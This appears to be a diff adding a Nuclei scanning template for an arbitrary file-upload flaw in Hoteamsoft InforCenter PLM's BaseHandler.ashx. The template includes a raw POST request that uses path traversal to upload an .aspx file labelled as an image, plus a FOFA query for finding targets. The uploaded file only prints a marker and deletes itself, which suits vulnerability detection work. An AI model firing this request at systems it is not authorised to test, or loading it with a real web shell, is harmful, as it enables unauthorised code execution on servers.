@@ -1,0 +1,48 @@
+id: hoteamsoft-plm-BaseHandler-fileupload
+info:
+  name: 华天软件 Inforcenter PLM uploadFileTolls 文件上漏洞
+  author: leadlife
+  severity: critical
+  description: InforCenter PLM是华天软件自主研发的制造业全生命周期管理平台，采用B/S与C/S混合架构，支持分布式部署。系统覆盖产品规划、设计、工艺、生产到报废回收的全流程，实现研发数据与制造业务的深度集成。uploadFileTolls接口存在文件上传漏洞。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/dp2xewa9v07z74h7
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/Base/BaseHandler.ashx"
+    hunter-query: demo
+    tips: shellpath in response body
+    repair:
+    version:
+  tags: fileupload,hoteamsoft,plm
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept: */*
+        Connection: close
+        Content-Length: 297
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.aspx"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#"%><%Response.Write("{{randstr}}");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'id','icon','name','size','src')
+        condition: and
